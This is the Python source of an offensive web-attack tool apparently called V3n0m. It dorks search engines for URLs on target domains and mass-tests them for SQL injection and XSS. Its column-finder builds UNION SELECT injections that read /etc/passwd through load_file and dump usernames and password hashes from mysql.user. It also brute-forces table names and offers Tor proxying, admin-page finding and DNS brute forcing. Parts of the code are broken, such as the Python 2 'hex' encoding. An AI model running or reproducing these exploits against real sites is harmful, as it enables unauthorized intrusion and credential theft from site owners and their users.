#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from modules import socks
import re
import random
import threading
import socket
import urllib
import subprocess
import time
import sys
import os
import asyncio
import requests
import zipfile
# import toxin
from glob import glob
from pathlib import Path
from datetime import datetime
from tempfile import mkdtemp


# Colours
White = "\033[0m"
Red = "\033[31m"
Green = "\033[32m"
Orange = "\033[33m"
Blue = "\033[34m"

vuln_list = ['error in your SQL syntax', 'mysql_fetch', 'num_rows', 'ORA-01756', 'Error Executing Database Query',
             'SQLServer JDBC Driver', 'OLE DB Provider for SQL Server', 'Unclosed quotation mark',
             'ODBC Microsoft Access Driver', 'Microsoft JET Database', 'Error Occurred While Processing Request',
             'Microsoft JET Database', 'Server Error', 'ODBC Drivers error', 'Invalid Querystring',
             'OLE DB Provider for ODBC', 'VBScript Runtime', 'ADODB.Field', 'BOF or EOF', 'ADODB.Command',
             'JET Database', 'mysql_fetch_array', 'Syntax error', 'mysql_numrows()', 'GetArray()', 'FetchRow()',
             'Input string was not in a correct format']

vuln_to = ['MySQL Classic', 'MiscError', 'MiscError2', 'Oracle', 'JDBC_CFM', 'JDBC_CFM2', 'MSSQL_OLEdb', 'MSSQL_Uqm',
           'MS-Access_ODBC', 'MS-Access_JETdb', 'Processing Request', 'MS-Access JetDb', 'Server Error',
           'ODBC Drivers error', 'Invalid Querystring', 'OLE DB Provider for ODBC', 'VBScript Runtime',
           'ADODB.Field', 'BOF or EOF', 'ADODB.Command', 'JET Database', 'mysql_fetch_array', 'Syntax error',
           'mysql_numrows()', 'GetArray()', 'FetchRow()', 'Input String Error']

list_count = 0
lfi_count = 0
arg_end = "--"
arg_eva = "+"
call = subprocess.call("", shell=True)
colMax = 60  # Change this at your will
endsub = 1
gets = 0
file = "/etc/passwd"
ProxyEnabled = False
menu = True
current_version = str("5.0")

try:
    d0rk = [line.strip() for line in open("lists/d0rks", "r", encoding="utf-8")]
    header = [line.strip() for line in open("lists/header", "r", encoding="utf-8")]
    xsses = [line.strip() for line in open("lists/xsses", "r", encoding="utf-8")]
    lfis = [line.strip() for line in open("lists/pathtotest_huge.txt", "r", encoding="utf-8")]
    tables = [line.strip() for line in open("lists/tables", "r", encoding="utf-8")]
    columns = [line.strip() for line in open("lists/columns", "r", encoding="utf-8")]
    search_Ignore = str(line.strip() for line in open("lists/search_ignore", "r", encoding="utf-8"))
    random.shuffle(d0rk)
    random.shuffle(header)
    random.shuffle(lfis)
except Exception as err:
    print(err)
    exit()


def logo():
    print("---------------------------------------------------")
    print("          ______   _        _______  _______ ")
    print("|\     /|/ ___  \ ( (    /|(  __   )(       )")
    print("| )   ( |\/   \  \|  \  ( || (  )  || () () |")
    print("| |   | |   ___) /|   \ | || | /   || || || |")
    print("( (   ) )  (___ ( | (\ \) || (/ /) || |(_)| |")
    print(" \ \_/ /       ) \| | \   ||   / | || |   | |")
    print("  \   /  /\___/  /| )  \  ||  (__) || )   ( |")
    print("   \_/   \______/ |/    )_)(_______)|/     \| v " + current_version)
    print("                                              by Da-vinci")
    print("         Proxy Enabled " + " [", ProxyEnabled, "] ")
    print("         Cache & Log Status " " [", cachestatus, "] ")
    print("         Vulnerable URL count:" "[", sql_count, "]")
    print("---------------------------------------------------")
    print("\n")


def main():
    while True:
        try:
            fmenu()
        except KeyboardInterrupt:
            sure = bool(input("Are you sure you want to exit? (y/n)"))
            if sure is True:
                exit()
            else:
                return 0


def fmenu():
    sql_list_counter()
    cache_Check()
    global customSelected
    global vuln
    global customlist
    vuln = []
    if endsub != 1:
        vulnscan()
    logo()
    print("[1] Dork and Vuln Scan")
    print("[2] Admin page finder")
    print("[3] Toxin - Mass IP/Port/Services Vuln Scanner")
    print("[4] DNS brute")
    print("[5] Enable Tor/Proxy Support")
    print("[6] Cloudflare Resolving")
    print("[7] Misc Options")
    print("[0] Exit\n")
    chce = input(":")

    if chce == "1":
        fscan()

    elif chce == "2":  # gotta fix this shit
        afsite = input("Enter the site eg target.com: ")
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        findadmin = subprocess.Popen("python3 " + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u "
                                     + str(afsite), shell=True,)
        findadmin.communicate()
        subprocess._cleanup()
    elif chce == "3":  # this shit has actually been done right
        # toxin.menu()
        return
    elif chce == "4":  # ew fuck who the fuck thought this was a good idea
        target_site = input("Enter the site eg target.com: ")
        print("[1] Normal Scan suitable for average sites")
        print("[2] Scan All The Things in The Internet, this will take a long time...")
        allthethings = input(":")
        att = ""
        if allthethings == "1":
            att = str(" ")
        elif allthethings == "2":
            att = str("att")
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(
            "python3 "
            + pwd
            + "/modules/dnsbrute.py -w lists/subdomains -u "
            + str(target_site)
            + att
            + " -t 200",
            shell=True,
        )
        dnsbrute.communicate()
        subprocess._cleanup()

    elif chce == "5":
        enable_proxy()

    elif chce == "0":
        print("\n Exiting ...")
        sys.exit(0)

    elif chce == "6":
        cloud()
        fmenu()

    elif chce == "7":
        os.system("clear")
        logo()
        print("[1] Skip to custom SQLi list checking")
        print("[2] Launch LFI Suite")
        print("[3] Print contents of Log files")
        print(
            "[4] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* "
        )
        print("[7] Start SQLmap *GUI MODE ONLY*")
        print("[0] Return to main menu")
        chce2 = input(":")
        if chce2 == "1":
            os.system("clear")
            customSelected = True
            injtest()
        elif chce2 == "2":  # and this...
            path = os.path.dirname(str(os.path.realpath(__file__)))
            lfisuite = subprocess.Popen("python3 " + path + "/lfisuite.py ", shell=True)
            lfisuite.communicate()
            subprocess._cleanup()
        elif chce2 == "3":
            for filename in glob("*.txt"):
                print(filename)
            print("Dumping output of Cache complete")
            return
        elif chce2 == "4":
            try:
                print("Checking if Cache or Logs even exist!")
                for filename in glob("*.txt"):
                    os.remove(filename)
                    print("Cache has been cleared, all logs have been deleted")
                    return
            except Exception:
                print("No Cache or Log Files to delete!")
        elif chce2 == "7":  # why? gotta decide whether to remove or keep this shit
            call("sudo sqlmap --wizard", shell=True)
        elif chce2 == "0":
            return


def fscan():
    global pages_pulled_as_one
    global usearch
    global numthreads
    global threads
    global finallist
    global finallist2
    global col
    global darkurl
    global sitearray
    global loaded_Dorks
    global sqli_confirmed
    threads = []
    finallist = []
    finallist2 = []
    col = []
    darkurl = []
    loaded_Dorks = []
    print(White)
    sites = input('\nChoose your target(domain) to force the domain restriction use for example "*.com" ')
    sitearray = [sites]
    dorks = input(
        "Choose the number of random dorks (0 for all.. may take awhile!)   : "
    )
    print("")
    try:
        if int(dorks) == 0:
            i = 0
            while i < len(d0rk):
                loaded_Dorks.append(d0rk[i])
                i += 1
        else:
            i = 0
            while i < int(dorks):
                loaded_Dorks.append(d0rk[i])
                i += 1
    except Exception as err:
        print(err)
        return
    numthreads = input("\nEnter no. of threads, Between 50 and 500: ")
    pages_pulled_as_one = input(
        "Enter no. of Search Engine Pages to be scanned per d0rk,  \n"
        " Between 25 and 100, increments of 25. Ie> 25:50:75:100   : "
    )
    print("\nNumber of SQL errors :", len(sql_count))
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(loaded_Dorks))
    print("Pages           :", pages_pulled_as_one)
    time.sleep(6)
    loop = asyncio.get_event_loop()
    usearch = loop.run_until_complete(search(pages_pulled_as_one))
    vulnscan()


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicinj(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


class xssthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicxss(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def classicxss(url):
    for xss in xsses:
        if url not in vuln:
            try:
                source = urllib.request.urlopen(url + xss.replace("\n", "")).read()
                if not (
                    not re.findall(str("<OY1Py"), source)
                    and not re.findall(str("<LOY2PyTRurb1c"), source)
                ):
                    print(
                        "\r\x1b[K[XSS]: ",
                        url + xss,
                        " ---> XSS Found",
                    )
                    xss_log_file.write("\n" + url + xss)
                    vuln.append(url)
            except Exception as err:
                print(err)
                if len(xss + url) < 147:
                    sys.stdout.write(Blue + "\r\x1b[K [*] Testing %s%s" % (url, xss))
                    sys.stdout.flush()


def xsstest():
    print(Blue + "\n[+] Preparing for XSS scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i : (x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = xssthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


customSelected = False
# Apoligies for this ugly section of code
# It is just a placeholder
# So dont worry, itll be replaced soon enough


def classicinj(url):
    aug_url = url + "'"
    global sql_list_counter
    global sql_list_count
    open("sqli_confirmed", "r+", encoding="utf-8")
    try:
        try:
            resp = urllib.request.urlopen(aug_url, timeout=2)
        except:  # if response is not Code:200 then instead of passing nothing causing hanging
            resp = str("v3n0m")
            # to throw a value to stop null/non-200-status messages hanging the scanner
        hits = str(resp.read())
        d = dict((error, vulnerability) for error, vulnerability in zip(vuln_list, vuln_to))
        for error in d:
            if error in hits:
                print(url + " is vulnerable to " + d[error])
                logfile.write("\n" + aug_url)
                vuln.append(hits)
                col.append(hits)
                sql_list_count += 1
                sqli_confirmed.write("\n" + aug_url)
            else:
                pass
    except:
        pass


def life_pulse():
    global life
    pulse_1 = datetime.now()
    life = pulse_1 - pulse
    print(life)


def injtest():
    global logfile
    global pulse
    global usearch
    global customlist
    global sql_list_counter
    global sql_list_count
    global sqli_confirmed
    pulse = datetime.now()
    holder = "sqli_confirmed"
    sqli_confirmed = open(os.path.realpath(holder), "a")
    if not customSelected:
        log = "v3n0m-sqli.txt"
        logfile = open(log, "a", encoding="utf-8")
        vb = len(usearch) / int(numthreads)
        i = int(vb)
        m = len(usearch) % int(numthreads)
        z = 0
        print(Blue + "\n[+] Preparing for SQLi scanning ...")
        print("[+] Can take a while and appear not to be doing anything...")
        print("[!] Please be patient if you can see this message, its Working ...\n")
        try:
            if len(threads) <= int(numthreads):
                for x in range(0, int(numthreads)):
                    sliced = usearch[x * i : (x + 1) * i]
                    if z < m:
                        sliced.append(usearch[int(numthreads) * i + z])
                        z += 1
                    thread = Injthread(sliced)
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
        except TimeoutError:
            pass
    else:
        try:
            log = input("Enter file name and location: ")
            with open(log, encoding="utf-8") as hodor:
                for line in hodor:
                    hold_door = str(line.rstrip()) + "'"
                    hold_the_door = line.rstrip()
                    try:
                        resp = urllib.request.urlopen(hold_door, timeout=2)
                        hits = str(resp.read())
                    except Exception as err:  # so the program doesn't crash
                        print(err)
                        hits = 'v3n0m'
                    d = dict((error, vulnerability) for error, vulnerability in zip(vuln_list, vuln_to))
                    for error in d:
                        if error in hits:
                            print(hold_the_door + " is vulnerable to" + d[error])
                            sqli_confirmed.write("\n" + hold_the_door)
                        else:
                            pass
        except FileNotFoundError or Exception as verb:
            print("Target file not found!")
            print(str(verb))
            time.sleep(2)
            fmenu()


def colfinder():
    print(Blue + "\n[+] Preparing for Column Finder ...")
    print("[+] Can take a while ...")
    print("[!] Working ...")
    for host in col:
        print(Red + "\n[+] Target: ", Orange + host)
        print(Red + "[+] Attempting to find the number of columns ...")
        print("[+] Testing: ", end=" ")
        checkfor = []
        host = host.rsplit("'", 1)[0]
        sitenew = (
            host
            + arg_eva
            + "and"
            + arg_eva
            + "1=2"
            + arg_eva
            + "union"
            + arg_eva
            + "all"
            + arg_eva
            + "select"
            + arg_eva
        )
        makepretty = ""
        for x in range(0, colMax):
            darkc0de = "dark" + str(x) + "c0de"
            try:
                sys.stdout.write("%s," % x)
                sys.stdout.flush()
                checkfor.append(darkc0de)
                if x > 0:
                    sitenew += ","
                sitenew += "0x" + str(darkc0de.encode("hex"))
                finalurl = sitenew + arg_end
                source = urllib.request.urlopen(finalurl).read()
                for y in checkfor:
                    colFound = re.findall(y, source)
                    if len(colFound) >= 1:
                        print("\n[+] Column length is:", len(checkfor))
                        nullcol = re.findall(str("\d+"), y)
                        print("[+] Found null column at column #:", nullcol[0])
                        for z in range(0, len(checkfor)):
                            if z > 0:
                                makepretty += ","
                            makepretty += str(z)
                        site = (
                            host
                            + arg_eva
                            + "and"
                            + arg_eva
                            + "1=2"
                            + arg_eva
                            + "union"
                            + arg_eva
                            + "all"
                            + arg_eva
                            + "select"
                            + arg_eva
                            + makepretty
                        )
                        print("[+] SQLi URL:", site + arg_end)
                        site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
                        site = site.replace(
                            arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,"
                        )
                        site = site.replace("," + nullcol[0], ",darkc0de")
                        print("[+] darkc0de URL:", site)
                        darkurl.append(site)

                        print("[-] Done!\n")
                        break
            except:
                pass

        print("\n[!] Sorry column length could not be found\n")
    print(Blue + "\n[+] Gathering MySQL Server Configuration...")
    for site in darkurl:
        head_url = (
            site.replace(
                "2600",
                "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)",
            )
            + arg_end
        )
        print(Red + "\n[+] Target:", Orange + site)
        while 1:
            try:
                source = urllib.request.urlopen(head_url).read()
                match = re.findall(str("\x1e\x1e\S+"), source)
                if len(match) >= 1:
                    match = match[0][2:].split("\x1e")
                    version = match[0]
                    user = match[1]
                    database = match[2]
                    print(White + "\n\tDatabase:", database)
                    print("\tUser:", user)
                    print("\tVersion:", version)
                    load = site.replace("2600", "load_file(0x2f6574632f706173737764)")
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("root:x"), source):
                        load = site.replace(
                            "2600",
                            "concat_ws(char(58),load_file(0x"
                            + str(file.encode("hex"))
                            + "),0x62616c74617a6172)",
                        )
                        source = urllib.request.urlopen(load).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print(
                                "\n[!] w00t!w00t!: "
                                + site.replace(
                                    "2600",
                                    "load_file(0x" + str(file.encode("hex")) + ")",
                                )
                            )
                        load = (
                            site.replace(
                                "2600",
                                "concat_ws(char(58),user,password,0x62616c74617a6172)",
                            )
                            + arg_eva
                            + "from"
                            + arg_eva
                            + "mysql.user"
                        )
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("NovaCygni"), source):
                        print(
                            "\n[!] w00t!w00t!: "
                            + site.replace("2600", "concat_ws(char(58),user,password)")
                            + arg_eva
                            + "from"
                            + arg_eva
                            + "mysql.user"
                        )
                print(White + "\n[+] Number of tables:", len(tables))
                print("[+] Number of columns:", len(columns))
                print("[+] Checking for tables and columns...")
                target = (
                    site.replace("2600", "0x62616c74617a6172")
                    + arg_eva
                    + "from"
                    + arg_eva
                    + "T"
                )
                for table in tables:
                    try:
                        target_table = target.replace("T", table)
                        source = urllib.request.urlopen(target_table).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] Table found: < " + table + " >")
                            print(
                                "\n[+] Lets check for columns inside table < "
                                + table
                                + " >"
                            )
                            for column in columns:
                                try:
                                    source = urllib.request.urlopen(
                                        target_table.replace(
                                            "0x62616c74617a6172",
                                            "concat_ws(char(58),0x62616c74617a6172,"
                                            + column
                                            + ")",
                                        )
                                    ).read()
                                    search = re.findall(str("NovaCygni"), source)
                                    if len(search) > 0:
                                        print("\t[!] Column found: < " + column + " >")
                                except (KeyboardInterrupt, SystemExit):
                                    raise
                                except (
                                    urllib.error.URLError,
                                    socket.gaierror,
                                    socket.error,
                                    socket.timeout,
                                ):
                                    pass

                            print(
                                "\n[-] Done searching inside table < "
                                + table
                                + " > for columns!"
                            )

                    except (KeyboardInterrupt, SystemExit):
                        raise
                    except (
                        urllib.error.URLError,
                        socket.gaierror,
                        socket.error,
                        socket.timeout,
                    ):
                        pass
                print("[!] Fuzzing is finished!")
                break
            except (KeyboardInterrupt, SystemExit):
                raise


def cloud():  # gotta fix this shit
    logo()
    target_site = input("Enter the site eg target.com: \n")
    print(Blue)
    pwd = os.path.dirname(str(os.path.realpath(__file__)))
    print(
        "Depth Level: 1) Scan top 30 subdomains 2) Scan top 200 subdomains 3) Scan over 9000+ subdomains "
    )
    depth = input("Input Depth Level, 1, 2 or 3 : ")
    scandepth = ""
    if depth == 1:
        scandepth = "--dept simple"
    elif depth == 2:
        scandepth = "--dept normal"
    elif depth == 3:
        scandepth = "--dept full"
    cloud = subprocess.Popen(
        "python3 " + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True
    )
    cloud.communicate()
    subprocess._cleanup()
    print("Cloud Resolving Finished")
    time.sleep(6)


def vulnscan():
    global endsub
    global lfi_log_file
    global rce_log_file
    global xss_log_file
    global vuln
    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding="utf-8")
    rce_log_file = open("v3n0m-rce.txt", "a", encoding="utf-8")
    xss_log_file = open("v3n0m-xss.txt", "a", encoding="utf-8")
    endsub = 0
    print(
        Red
        + "\n[1] SQLi Testing, "
        + Orange
        + "Will verify the Vuln links and print the Injectable URL to the screen"
    )
    print(
        Red
        + "[2] SQLi Testing Auto Mode "
        + Orange
        + "Will attempt to Verify vuln sites then Column count if MySQL detected"
    )
    print(Red + "[3] XSS Testing")
    print(Red + "[4] Save valid Sorted and confirmed vuln urls to file")
    print(Red + "[5] Print all the UNSORTED urls ")
    print(Red + "[6] Print all Sorted and Confirmed Vulns from last scan again")
    print(Red + "[7] Back to main menu")
    chce = input(":")
    if chce == "1":
        os.system("clear")
        vuln = []
        injtest()
        print("\r\x1b[K [*] Scan complete, " + str(len(col)) + " vuln sites found.\r\n")
    elif chce == "2":
        os.system("clear")
        vuln = []
        injtest()
        colfinder()
        endsub = 0
        print(
            Blue
            + "\r\x1b[K [*] Scan complete, "
            + Orange
            + str(len(vuln))
            + Blue
            + " vuln sites found."
        )
        print()
    elif chce == "3":
        os.system("clear")
        vuln = []
        xsstest()
        print(
            Blue
            + "\r\x1b[K [*] Scan complete, "
            + Orange
            + str(len(vuln))
            + Blue
            + " vuln sites found."
        )
        print()
        endsub = 0
    elif chce == "4":
        print(Blue + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
        listname = input("Filename: ").encode("utf-8")
        list_name = open(listname, "w", encoding="utf-8")
        finallist.sort()
        for t in finallist:
            list_name.write(t + "\n")
        list_name.close()
        print("Urls saved, please check", listname)
        endsub = 0
    elif chce == "5":
        print(White + "\nPrinting valid urls:\n")
        finallist.sort()
        for t in finallist:
            print(Blue + t)
        endsub = 0
    elif chce == "6":
        print(Blue + "\nVuln found ", len(vuln))
        print(vuln)
        endsub = 0
    elif chce == "7":
        endsub = 1
        fmenu()
    else:
        fmenu()


def ignoringGet(url):
    try:
        try:
            responce = requests.get(url, timeout=2)
            responce.raise_for_status()
        except Exception:
            return ""
        return responce.text
    except Exception as verb:
        print(str(verb))


def CreateTempFolder(self):
    self.temp = mkdtemp(prefix="v3n0m")
    if not self.temp.endswith(os.sep):
        self.temp += os.sep


def progressBar(blocknum, blocksize, totalsize):
    readsofar = blocknum * blocksize
    if totalsize > 0:
        percent = readsofar * 1e2 / totalsize
        s = "\r%5.1f%% %*d / %d" % (percent, len(str(totalsize)), readsofar, totalsize)
        sys.stderr.write(s)
    if readsofar >= totalsize:  # near the end
        sys.stderr.write("\n")


def download(url, file, progressBar=None):
    print("Downloading %s" % url)
    urllib.request.urlretrieve(url, file, progressBar)


def unzip(file):
    with zipfile.ZipFile(file + "", "w") as myzip:
        myzip.write(file)
    os.remove(file + "")


downloads = [
    ["https://www.cloudflare.com/ips-v4", "ips-v4", progressBar],
    ["https://www.cloudflare.com/ips-v6", "ips-v6", progressBar],
    ["http://crimeflare.net:82/domains/ipout.zip", "ipout.zip", progressBar],
]


async def search(pages_pulled_as_one):
    urls = []
    urls_len_last = 0
    timestart = datetime.now()
    for site in sitearray:
        progress = 0
        for dork in loaded_Dorks:
            progress += 1
            page = 0
            while page < int(pages_pulled_as_one):
                query = dork + "+site:" + site
                futures = []
                loop = asyncio.get_event_loop()
                for i in range(25):
                    results_web = (
                        "http://www.bing.com/search?q="
                        + query
                        + "&go=Submit&first="
                        + str((page + i) * 50 + 1)
                        + "&count=50"
                    )
                    futures.append(loop.run_in_executor(None, ignoringGet, results_web))
                page += 25
                stringreg = re.compile('(?<=href=")(.*?)(?=")')
                names = []
                for future in futures:
                    result = await future
                    names.extend(stringreg.findall(result))
                domains = set()
                for name in names:
                    basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
                    if (
                        (basename is None)
                        or re.search("google", name)
                        or re.search("facebook", name)
                        or re.search("twitter", name)
                        or re.search("gov", name)
                        or re.search("fbi", name)
                        or re.search("javascript", name)
                        or re.search("stackoverflow", name)
                        or re.search("microsoft", name)
                        or re.search("24img.com", name)
                        or re.search("v3n0m", name)
                        or re.search("venom", name)
                        or re.search("evilzone", name)
                        or re.search("iranhackers", name)
                        or re.search("pastebin", name)
                        or re.search("charity", name)
                        or re.search("school", name)
                        or re.search("learning", name)
                    ):
                        basename = re.search(r"(?<=://).*", name)
                    if basename is not None:
                        basename = basename.group(0)
                    if basename not in domains and basename is not None:
                        domains.add(basename)
                        urls.append(name)
                totalprogress = len(loaded_Dorks)
                percent = int((1.0 * progress / int(totalprogress)) * 100)
                urls_len = len(urls)
                os.system("clear")
                start_time = datetime.now()
                timeduration = start_time - timestart
                ticktock = timeduration.seconds
                hours, remainder = divmod(ticktock, 3600)
                minutes, seconds = divmod(remainder, 60)
                sys.stdout.flush()
                logo()
                sys.stdout.write(
                    "\r\n[K  | Domain: <%s> Has been targeted \r\n "
                    "| Collected urls: %s Since start of scan \r\n"
                    " | D0rks: %s/%s Progressed so far \r\n"
                    " | Percent Done: %s \r\n"
                    " | Dork In Progress: %s\r\n"
                    " | Elapsed Time: %s\r\n"
                    % (
                        site,
                        repr(urls_len),
                        progress,
                        totalprogress,
                        repr(percent),
                        dork,
                        "%s:%s:%s" % (hours, minutes, seconds),
                    )
                )
                sys.stdout.flush()
                if urls_len == urls_len_last:
                    page = int(pages_pulled_as_one)
                urls_len_last = urls_len
    tmplist = []
    print(
        "\n\n[+] URLS (unsorted) : Contains all the trash results still including duplicates: ",
        len(urls),
    )
    for url in urls:
        try:
            host = url.split("/", 3)
            domain = host[2]
            if domain not in tmplist and "=" in url:
                finallist.append(url)
                tmplist.append(domain)
        except KeyboardInterrupt:
            os.system("clear")
            chce1 = input(":")
            logo()
            print(Green + "Program Paused" + Red)
            print("[1] Unpause")
            print("[2] Skip rest of scan and Continue with current results")
            print("[3] Return to main menu")
            if chce1 == "1":
                return
            if chce1 == "2":
                vulnscan()
            if chce1 == "3":
                fmenu()
            else:
                pass
            continue
    print(
        "[+] URLS (sorted)  : Trash, Duplicates,"
        + "Dead-Links and other rubbish removed "
        + len(finallist)
    )
    return finallist


def enable_proxy():
    global ProxyEnabled
    try:
        requiresID = bool(
            input("Requires Username/Password?"
                  "Leave Blank if not required, otherwise type y/yes/true/True  :"))
        print(requiresID)
        print("Please select Proxy Type - Options = socks4, socks5  : ")
        proxytype = str(input())
        print(" Please enter Proxy IP address - ie. 127.0.0.1(localhost)  :")
        proxyip = str(input())
        print(" Please enter Proxy Port - ie. 9001(tor)  :")
        proxyport = int(input())
        if proxytype == str("socks4"):
            if requiresID:
                try:
                    socks.setdefaultproxy(
                        socks.PROXY_TYPE_SOCKS4,
                        proxyip,
                        proxyport,
                        username=input("Proxy Account Username  :"),
                        password=input("Proxy Account Password  :"),
                    )
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception as verb:
                    print(str(verb))
                    time.sleep(5)
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception as verb:
                    print(str(verb))
                    time.sleep(5)
                    pass
        elif proxytype == str("socks5"):
            if requiresID:
                try:
                    socks.setdefaultproxy(
                        socks.PROXY_TYPE_SOCKS5,
                        proxyip,
                        proxyport,
                        username=input("Proxy Account Username  :"),
                        password=input("Proxy Account Password  :"),
                    )
                    print(" Socks 5 Proxy Support Enabled")
                    socks.socket = socks.socksocket
                    ProxyEnabled = str("True")
                except Exception as verb:
                    print(verb)
                    time.sleep(5)
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 5 Proxy Support Enabled")
                    ProxyEnabled = str("True")
                except Exception as verb:
                    print(verb)
                    time.sleep(5)
                    pass
    except Exception:
        pass


def cache_Check():
    global cachestatus
    my_file1 = Path("v3n0m-lfi.txt")
    my_file2 = Path("v3n0m-rce.txt")
    my_file3 = Path("v3n0m-xss.txt")
    my_file5 = Path("v3n0m-sqli.txt")
    my_file4 = Path("IPLogList.txt")
    if (
        my_file1.is_file()
        or my_file2.is_file()
        or my_file3.is_file()
        or my_file4.is_file()
        or my_file5.is_file()
    ):
        cachestatus = "** Cache NOT Empty**"
    else:
        cachestatus = "Cache is Empty "


def sql_list_counter():
    global sql_count
    try:
        f = open("v3n0m-sqli.txt", encoding="utf-8")
        li = [x for x in f.readlines() if x != "\n"]
        sql_count = len(li)
    except FileNotFoundError:
        sql_count = 0


def lfi_list_counter():
    global lfi_count
    try:
        f = open("v3n0m-lfi.txt", encoding="utf-8")
        li = [x for x in f.readlines() if x != "\n"]
        lfi_count = len(li)
    except FileNotFoundError:
        lfi_count = 0


if __name__ == "__main__":
    print('hello')
    main()
